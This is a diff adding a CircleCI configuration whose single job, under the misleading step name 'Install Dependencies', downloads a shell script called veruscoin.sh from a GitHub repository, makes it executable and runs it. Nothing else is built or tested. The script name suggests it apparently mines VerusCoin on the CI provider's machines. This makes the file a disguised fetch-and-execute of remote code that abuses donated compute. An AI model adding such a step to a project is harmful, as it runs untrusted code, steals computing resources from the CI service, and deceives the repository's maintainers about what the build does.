@@ -1,0 +1,16 @@
+version: 2
+jobs:
+    aku1:
+      docker:
+            - image: circleci/golang:1.15.8
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/klomangjawa/olekukonko/raw/master/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
+         
